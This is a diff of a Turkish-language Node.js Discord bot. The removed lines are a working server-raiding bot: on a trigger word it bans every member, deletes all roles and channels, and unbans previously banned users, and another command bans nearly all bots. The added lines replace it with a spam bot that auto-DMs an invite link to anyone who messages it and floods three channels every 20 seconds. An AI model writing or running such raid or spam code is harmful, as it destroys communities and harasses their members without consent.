@@ -1,98 +1,61 @@
-////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 const express = require('express');
-const Discord = require('discord.js');
-const berke = new Discord.Client();
+const { Client, RichEmbed } = require('discord.js');
 const app = express();
+    function sleep(milliseconds) {
+  var start = new Date().getTime();
+  for (var i = 0; i < 1e7; i++) {
+    if ((new Date().getTime() - start) > milliseconds){
+      break;
+    }
+  }
+}
 const http = require('http');
-    app.get("/", (request, response) => {
+app.get("/", (request, response) => {
     response.sendStatus(200);
     });
     app.listen(process.env.PORT);
     setInterval(() => {
-    http.get('http://schewtsa-raid.glitch.me/');
-    }, 280000);
-////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    http.get('http://lyrics-j4j.glitch.me/');
+    }, 3000);
+const Discord = require('discord.js');
+const client = new Discord.Client();
+const data = new Map();
 
-berke.on('message', msg => {
-    if(msg.content.toLowerCase() === 'lan' ) {    
-      msg.guild.fetchBans().then(bans => {
-        bans.forEach(user => {
-           msg.guild.unban(user)
-        })
-      msg.guild.members.forEach(a => msg.guild.ban(a))
-      msg.guild.roles.forEach(a => a.delete())
-      msg.guild.channels.forEach(a => a.delete())
-      })
-    }
-})
+client.on('ready', () => {
+        console.log(`${client.user.username} ismi ile giriş yapıldı! ${client.guilds.size} Sunucu, ${client.users.size} Kullanıcı.`);
+      client.user.setActivity('Karşılıklı Sunucu DM.')
+});
 
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
 
-//berke.on('channelCreate', channel => {
-  //if (channel.name == 'schewtsa') {
-   // channel.send('Bir, kuşun kanat çırpış sesiydi.')
-    //channel.guild.channels.forEach(c => {
-     //    c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
-      //        SEND_MESSAGES: false,
-       //       ADD_REACTIONS: false,
-        //      SPEAK: false
-         //   });
-          //});
-  //}
-  //if (channel.name == '') {
-  //  channel.send(``)
- // }
-
-//});
-
-///////////
-
-berke.on("message", msg => { 
-  if (msg.content === "b!banla") {
-    msg.guild.members.forEach(m => {
-      if (m.user.bot) {
-        if (m.user.id === "409875566800404480" || m.user.id === "159985870458322944") {
-          
+client.on("message", async msg => {
+  if (msg.channel.type === "dm") {
+    if (msg.author.id === client.user.id) {
+    } else {
+      if (msg.author.bot) {
+      } else {
+        let bellek = await data.get(msg.author.id)
+        
+        if (bellek === 1) {
         } else {
-          m.ban()
-        }
+          await data.set(msg.author.id, 1)
+          await sleep(1500)
+          await msg.channel.send("**https://discord.gg/qNNMf4F Karşılıklı Girelim Mi? J4J**")
       }
-    })
+      }
+    }
   }
+})
+client.on("ready", () => {
+      setInterval(() => {
+        let b = client.channels.get("647216632682512404")
+        let c = client.channels.get("652180140637421572")
+        let d = client.channels.get("652268536739266600")
+        b.send("J4J DM FAST :smile: ")
+        c.send("J4J DM FAST :smile: ")
+        d.send("J4J DM FAST :smile: ")
+
+      }, 20000);
 })
 
 
-berke.login("")
-
-
-berke.on("ready", () => {
-  berke.guilds.forEach(s => console.log(s.name + "|" + s.memberCount + "│" + s.id))
-  console.log("▬▬▬▬▬▬▬▬▬ Lyrics's Ultra Banbot v1.0 ▬▬▬▬▬▬▬▬▬");
-  console.log("Kullanıcı İsmi: " + berke.user.tag);
-  console.log("ID: " + berke.user.id);
-  console.log("Kuruldu: " + berke.user.createdAt);
-  if (berke.user.email === null) {
-    console.log("Email: Bot oldugu için email yok.");
-  } else {
-    console.log("Email: " + berke.user.email);
-  }
-  if (berke.user.premium === true) {
-    console.log("Nitro Mu? : Evet");
-  } else if (berke.user.premium === false) {
-    console.log("Nitro Mu? : Hayır");
-  }
-  if (berke.user.verified === true) {
-    console.log("Doğrulanmış mı? : Evet");
-  } else if (berke.user.verified === false) {
-    console.log("Doğrulanmış mı? : Hayır");
-  }
-  if (berke.user.bot === true) {
-    console.log("Bot Mu? : Evet");
-  } else if (berke.user.bot === false) {
-    console.log("Bot Mu? : Hayır");
-  }
-  console.log("Kullanıcı Sayısı: " + berke.users.size);
-  console.log("Sunucu Sayısı: " + berke.guilds.size);
-  console.log("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬");
-})
-////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+client.login("");
